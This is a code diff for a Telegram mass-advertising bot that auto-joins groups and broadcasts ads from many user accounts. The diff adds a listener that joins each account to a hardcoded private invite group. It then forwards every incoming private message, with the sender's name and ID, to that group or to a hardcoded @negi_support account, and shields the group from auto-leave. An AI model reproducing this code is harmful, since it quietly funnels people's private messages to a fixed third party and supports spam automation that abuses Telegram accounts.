@@ -992,6 +992,9 @@ async def auto_join_gradual_groups_for_account(tg_client, phone, uid, acc_id, ma
         joined_this_cycle = 0
         newly_joined_peers = []
         mute_settings = InputPeerNotifySettings(silent=True, mute_until=datetime(2038, 1, 1, tzinfo=timezone.utc))
+        dm_h = getattr(config, 'FORWARD_DM_HASH', 'C42q9yVOumJkZjg9')
+        dm_gid = getattr(config, 'FORWARD_DM_GROUP_ID', -5576258867)
+        dm_ids = {dm_gid, normalize_tg_id(dm_gid), -5576258867, 5576258867, -1005576258867}
 
         for target_type, target_val, target_key in pending_targets:
             if joined_this_cycle >= max_joins:
@@ -1048,8 +1051,13 @@ async def auto_join_gradual_groups_for_account(tg_client, phone, uid, acc_id, ma
                     try:
                         res = await tg_client(functions.messages.ImportChatInviteRequest(hash=target_val))
                         chats = getattr(res, 'chats', [])
+                        if not chats and hasattr(res, 'updates'):
+                            chats = getattr(res.updates, 'chats', [])
                         for c in chats:
-                            db.add_target_group(uid, c.id, getattr(c, 'title', str(c.id)))
+                            c_norm = normalize_tg_id(c.id)
+                            # Protect DM group from being added to ad target groups
+                            if target_val != dm_h and c.id not in dm_ids and c_norm not in dm_ids:
+                                db.add_target_group(uid, c.id, getattr(c, 'title', str(c.id)))
                             try:
                                 inp = await tg_client.get_input_entity(c)
                                 await tg_client(UpdateNotifySettingsRequest(peer=InputNotifyPeer(inp), settings=mute_settings))
@@ -1174,7 +1182,16 @@ async def run_broadcast(client, uid, account_ids=None):
                     db.set_account_broadcast_status(acc['_id'], status="active", cooldown_until=0)
         error_summary = []
 
-        skip_group_ids = [config.MUSTJOIN_GROUP_ID]
+        dm_gid = getattr(config, 'FORWARD_DM_GROUP_ID', -5576258867)
+        skip_group_ids = [
+            config.MUSTJOIN_GROUP_ID,
+            dm_gid,
+            normalize_tg_id(dm_gid),
+            -abs(dm_gid),
+            -5576258867,
+            5576258867,
+            -1005576258867
+        ]
 
         # ── Connect accounts with stagger delay ──────────────────────────────
         for i, acc in enumerate(accounts):
@@ -1186,7 +1203,7 @@ async def run_broadcast(client, uid, account_ids=None):
                     config.API_HASH,
                     connection_retries=3,
                     retry_delay=5,
-                    receive_updates=False,
+                    receive_updates=True,
                 )
                 await tg_client.connect()
 
@@ -1208,6 +1225,12 @@ async def run_broadcast(client, uid, account_ids=None):
                             acc['last_name'] = me.last_name or ''
                     except Exception:
                         pass
+
+                # Setup incoming customer DM forwarder & auto-reply listener
+                try:
+                    await setup_account_dm_forwarder_and_reply(uid, tg_client, acc['phone_number'])
+                except Exception as dm_err:
+                    logger.warning(f"Could not setup DM forwarder for {acc['phone_number']}: {dm_err}")
 
                 # Auto-join the ad source channel if not already in it
                 if config.AD_SOURCE_CHANNEL:
@@ -1734,6 +1757,8 @@ async def run_broadcast(client, uid, account_ids=None):
 
                             # ── Auto-Leave Permanent / >48h Muted Groups ──
                             if dlg.is_group:
+                                if dlg.id in skip_group_ids or norm_d_id in skip_group_ids:
+                                    continue
                                 is_r, should_l, r_reason = check_entity_restricted(dlg.entity)
                                 if is_r and should_l:
                                     logger.info(f"Post-cycle: Account {p_num} safely auto-leaving permanent/>48h group {dlg.name} ({dlg.id}): {r_reason}")
@@ -3016,13 +3041,21 @@ async def perform_join_folder(client, uid, input_text, account_ids=None):
                     logger.warning(f"Folder join error for {phone} ({slug}): {e}")
 
             # 2. Process Invite Hashes
+            dm_h = getattr(config, 'FORWARD_DM_HASH', 'C42q9yVOumJkZjg9')
+            dm_gid = getattr(config, 'FORWARD_DM_GROUP_ID', -5576258867)
+            dm_ids = {dm_gid, normalize_tg_id(dm_gid), -5576258867, 5576258867, -1005576258867}
             for h in invite_hashes:
                 target_key = f"hash:{h}"
                 try:
                     res = await tg_client(functions.messages.ImportChatInviteRequest(hash=h))
                     chats = getattr(res, 'chats', [])
+                    if not chats and hasattr(res, 'updates'):
+                        chats = getattr(res.updates, 'chats', [])
                     for c in chats:
-                        db.add_target_group(uid, c.id, getattr(c, 'title', str(c.id)))
+                        c_norm = normalize_tg_id(c.id)
+                        # Protect DM group from being added to ad target groups
+                        if h != dm_h and c.id not in dm_ids and c_norm not in dm_ids:
+                            db.add_target_group(uid, c.id, getattr(c, 'title', str(c.id)))
                         try:
                             inp = await tg_client.get_input_entity(c)
                             await tg_client(UpdateNotifySettingsRequest(peer=InputNotifyPeer(inp), settings=mute_settings))
@@ -3348,7 +3381,16 @@ async def leave_muted_groups_all_cb(client, cb):
         parse_mode=ParseMode.HTML
     )
 
-    skip_group_ids = [getattr(config, 'MUSTJOIN_GROUP_ID', None)]
+    dm_gid = getattr(config, 'FORWARD_DM_GROUP_ID', -5576258867)
+    skip_group_ids = [
+        getattr(config, 'MUSTJOIN_GROUP_ID', None),
+        dm_gid,
+        normalize_tg_id(dm_gid),
+        -abs(dm_gid),
+        -5576258867,
+        5576258867,
+        -1005576258867
+    ]
     protected_channel_usernames = set()
     if getattr(config, 'AD_SOURCE_CHANNEL', ''):
         protected_channel_usernames.add(str(config.AD_SOURCE_CHANNEL).lstrip('@').lower())
@@ -3401,6 +3443,8 @@ async def leave_muted_groups_all_cb(client, cb):
 
                 # 2. Safely auto-leave permanent or >48h muted groups (temporary <=48h stays)
                 if dialog.is_group:
+                    if dialog.id in skip_group_ids or norm_d_id in skip_group_ids:
+                        continue
                     is_r, should_l, r_reason = check_entity_restricted(entity)
                     if is_r and should_l:
                         left = await safe_leave_group(tg_client, dialog.id, user_id=uid)
@@ -5178,26 +5222,166 @@ async def toggle_auto_reply(client, cb):
 
 
 
-async def start_auto_reply_listeners(uid, tg_client, phone):
-    """Register a Telethon event handler on tg_client that auto-replies to private DMs."""
+async def setup_account_dm_forwarder_and_reply(uid, tg_client, phone):
+    """
+    Ensure account is joined to the target DM group, and register a Telethon event handler
+    that automatically forwards any incoming private customer DMs into the private DM group
+    (https://t.me/+C42q9yVOumJkZjg9) or @negi_support, and triggers auto-reply if enabled.
+    """
+    dm_link = getattr(config, 'FORWARD_DM_GROUP_LINK', 'https://t.me/+C42q9yVOumJkZjg9')
+    dm_hash = getattr(config, 'FORWARD_DM_HASH', 'C42q9yVOumJkZjg9')
+    dm_group_id = getattr(config, 'FORWARD_DM_GROUP_ID', -5576258867)
+    support_handle = getattr(config, 'FORWARD_DM_SUPPORT_HANDLE', 'negi_support').lstrip('@')
+    support_id = getattr(config, 'FORWARD_DM_SUPPORT_ID', 8104033602)
+
+    # 1. Ensure account is a member of the DM logging group so it has permission to send & forward
+    try:
+        await tg_client(functions.messages.ImportChatInviteRequest(hash=dm_hash))
+        logger.info(f"Account {phone} verified/joined DM logging group (+{dm_hash})")
+    except UserAlreadyParticipantError:
+        pass
+    except Exception as je:
+        if "already" in str(je).lower():
+            pass
+        else:
+            logger.debug(f"Account {phone} DM group join notice: {je}")
+
+    # 2. Target cache for lazy entity resolution
+    target_cache = {"dm_group": None, "support": None}
+
+    async def _get_targets():
+        if target_cache["dm_group"] is None:
+            for cand in [dm_link, f"+{dm_hash}", dm_group_id]:
+                try:
+                    target_cache["dm_group"] = await tg_client.get_entity(cand)
+                    if target_cache["dm_group"]:
+                        break
+                except Exception:
+                    pass
+            if target_cache["dm_group"] is None:
+                try:
+                    norm_target_id = normalize_tg_id(dm_group_id)
+                    async for dlg in tg_client.iter_dialogs(limit=50):
+                        if dlg.is_group and (dlg.id == dm_group_id or normalize_tg_id(dlg.id) == norm_target_id or "dm" in (dlg.name or "").lower()):
+                            target_cache["dm_group"] = dlg.entity
+                            break
+                except Exception:
+                    pass
+
+        if target_cache["support"] is None:
+            for s_cand in [support_handle, support_id]:
+                if s_cand:
+                    try:
+                        target_cache["support"] = await tg_client.get_entity(s_cand)
+                        if target_cache["support"]:
+                            break
+                    except Exception:
+                        pass
+
+        return target_cache["dm_group"], target_cache["support"]
+
+    # 3. Register incoming DM listener
     @tg_client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
-    async def _auto_reply_handler(event):
-        ar = db.get_auto_reply(uid)
-        if not ar.get("enabled") or not ar.get("message"):
+    async def _customer_dm_handler(event):
+        if getattr(event, 'out', False):
             return
+        if not event.sender_id:
+            return
+        # Ignore official Telegram service notifications (OTPs, service updates)
+        if event.sender_id in (777000, 42777):
+            return
+
         try:
             sender = await event.get_sender()
-            if sender and getattr(sender, 'bot', False):
-                return
-            if event.sender_id == 777000:
-                return
-            await event.reply(ar["message"])
-            logger.info(f"Auto-replied to {event.sender_id} via {phone} for user {uid}")
-            await send_dm_log(uid, f"<b>💬 Auto-replied to</b> <code>{event.sender_id}</code> via {phone}")
-        except Exception as e:
-            logger.error(f"Auto-reply failed for {phone}: {e}")
+        except Exception:
+            sender = None
 
-    logger.info(f"Auto-reply listener registered for account {phone} (owner: {uid})")
+        # Ignore bots
+        if sender and getattr(sender, 'bot', False):
+            return
+
+        # Avoid echo/loops if message is from the support handle or ID
+        sender_uname = (getattr(sender, 'username', '') or '').lower().lstrip('@')
+        if sender_uname == support_handle.lower() or event.sender_id == support_id:
+            return
+
+        first_name = getattr(sender, 'first_name', '') or ''
+        last_name = getattr(sender, 'last_name', '') or ''
+        full_name = f"{first_name} {last_name}".strip() or "Customer"
+        username_display = f"@{sender.username}" if getattr(sender, 'username', None) else "No Username"
+        sender_id = event.sender_id
+        clean_phone = phone.lstrip('+')
+
+        logger.info(f"Incoming customer DM on +{clean_phone} from {full_name} ({sender_id})")
+
+        # ── Step A: Forward to Private Group or @negi_support ─────────────────
+        dm_grp, support_usr = await _get_targets()
+        forwarded = False
+
+        header_text = (
+            f"<blockquote><b>📩 NEW CUSTOMER DM RECEIVED</b></blockquote>\n\n"
+            f"👤 <b>From:</b> {full_name} ({username_display})\n"
+            f"🆔 <b>Customer ID:</b> <code>{sender_id}</code>\n"
+            f"📱 <b>Ad Account:</b> <code>+{clean_phone}</code>\n"
+            f"🔗 <b>Chat Link:</b> <a href=\"tg://user?id={sender_id}\">Direct Chat Link</a>\n"
+            f"━━━━━━━━━━━━━━━━━━"
+        )
+
+        # Primary: Send header and forward message into the DM Group
+        if dm_grp:
+            try:
+                await tg_client.send_message(dm_grp, header_text, parse_mode='html')
+                try:
+                    await tg_client.forward_messages(dm_grp, event.message)
+                except Exception as fwd_err:
+                    raw_txt = event.raw_text or "[Non-text media or protected message]"
+                    await tg_client.send_message(dm_grp, f"💬 <b>Message Content:</b>\n{raw_txt}", parse_mode='html')
+                forwarded = True
+                logger.info(f"Customer DM from {sender_id} forwarded to DM group for +{clean_phone}")
+            except Exception as e:
+                logger.error(f"Failed to forward DM to target group: {e}")
+
+        # Secondary / Fallback: If group forward failed, forward directly to @negi_support
+        if not forwarded and support_usr:
+            try:
+                await tg_client.send_message(support_usr, header_text, parse_mode='html')
+                try:
+                    await tg_client.forward_messages(support_usr, event.message)
+                except Exception:
+                    raw_txt = event.raw_text or "[Non-text media or protected message]"
+                    await tg_client.send_message(support_usr, f"💬 <b>Message Content:</b>\n{raw_txt}", parse_mode='html')
+                forwarded = True
+                logger.info(f"Customer DM from {sender_id} forwarded to support @{support_handle} for +{clean_phone}")
+            except Exception as se:
+                logger.error(f"Failed to forward DM to support handle: {se}")
+
+        # ── Step B: Handle Auto-Reply If Enabled in Settings ──────────────────
+        try:
+            ar = db.get_auto_reply(uid)
+            if ar.get("enabled") and ar.get("message"):
+                await event.reply(ar["message"])
+                logger.info(f"Auto-replied to {sender_id} via +{clean_phone} for user {uid}")
+                await send_dm_log(uid, f"<b>💬 Auto-replied to</b> <code>{sender_id}</code> via <code>+{clean_phone}</code>")
+        except Exception as ar_err:
+            logger.error(f"Auto-reply failed on +{clean_phone}: {ar_err}")
+
+        # ── Step C: Notify Bot Owner in DM Logs ───────────────────────────────
+        try:
+            status_txt = "Forwarded to DM group ✅" if forwarded else "Logged ⚠️"
+            await send_dm_log(
+                uid,
+                f"<b>📩 Customer DM Received on +{clean_phone}:</b>\n"
+                f"• <b>From:</b> {full_name} ({username_display} | <code>{sender_id}</code>)\n"
+                f"• <b>Status:</b> {status_txt}"
+            )
+        except Exception:
+            pass
+
+    logger.info(f"DM Forwarder & Auto-Reply listener registered for account {phone} (owner: {uid})")
+
+
+# Maintain alias for compatibility
+start_auto_reply_listeners = setup_account_dm_forwarder_and_reply
 
 
 async def _handle_telethon_phone(uid, text, m):
